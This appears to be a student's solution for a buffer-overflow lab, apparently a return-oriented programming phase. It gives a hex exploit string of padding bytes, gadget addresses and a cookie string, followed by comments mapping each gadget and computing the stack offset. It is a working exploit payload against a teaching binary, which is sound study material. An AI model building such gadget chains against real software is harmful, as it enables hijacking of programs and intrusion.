31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 06 1a 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 ab 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00 34 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00


/*

401a06  rsp -> rax

4019a2  rax -> rdi


4019ab  popq rax

4019dd  eax -> edx

401a34  edx -> ecx

401a13  ecx -> esi


4019d6 

4019a2

112=16*7=0x70

mov rsp rdi
popq rsi
lea (rdi,rsi,1) rax
mov rax rdi

*/
